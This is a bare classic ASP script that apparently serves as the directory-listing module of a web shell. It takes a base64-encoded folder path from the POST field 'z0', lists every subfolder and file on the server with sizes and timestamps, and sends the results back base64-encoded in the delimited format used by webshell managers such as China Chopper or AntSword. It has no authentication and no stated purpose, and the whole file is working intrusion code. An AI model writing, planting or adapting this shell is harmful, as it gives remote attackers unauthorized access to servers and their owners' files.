<%
Function Base64Decode(ByVal strData)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.Text = strData
    Base64Decode = node.nodeTypedValue
End Function

Function Base64Encode(ByVal strData)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = StrToBytes(strData)
    Base64Encode = Replace(node.Text, vbLf, "")
End Function

Function StrToBytes(str)
    Dim stm
    Set stm = CreateObject("ADODB.Stream")
    stm.Type = 2
    stm.Charset = "utf-8"
    stm.Open
    stm.WriteText str
    stm.Position = 0
    stm.Type = 1
    StrToBytes = stm.Read
    stm.Close
End Function

Function FormatDateTimeISO(dt)
    FormatDateTimeISO = _
        Year(dt) & "-" & _
        Right("0" & Month(dt),2) & "-" & _
        Right("0" & Day(dt),2) & " " & _
        Right("0" & Hour(dt),2) & ":" & _
        Right("0" & Minute(dt),2) & ":" & _
        Right("0" & Second(dt),2)
End Function

Dim dirPath
dirPath = Base64Decode(Request.Form("z0"))

Dim fso
Set fso = Server.CreateObject("Scripting.FileSystemObject")

If Not fso.FolderExists(dirPath) Then
    Response.Write "ERROR://Unable to open directory"
    Response.End
End If

Dim folder
Set folder = fso.GetFolder(dirPath)

Dim result
result = ""

Dim f
For Each f In folder.SubFolders

    If result <> "" Then result = result & "|"

    result = result & _
        Base64Encode("/" & f.Name) & "?" & _
        "d---------" & "?" & _
        "0" & "?" & _
        FormatDateTimeISO(f.DateCreated) & "?" & _
        FormatDateTimeISO(f.DateLastModified) & "?" & _
        FormatDateTimeISO(f.DateLastAccessed)

Next

Dim file
For Each file In folder.Files

    If result <> "" Then result = result & "|"

    result = result & _
        Base64Encode(file.Name) & "?" & _
        "r---------" & "?" & _
        file.Size & "?" & _
        FormatDateTimeISO(file.DateCreated) & "?" & _
        FormatDateTimeISO(file.DateLastModified) & "?" & _
        FormatDateTimeISO(file.DateLastAccessed)

Next

Response.Write result
%>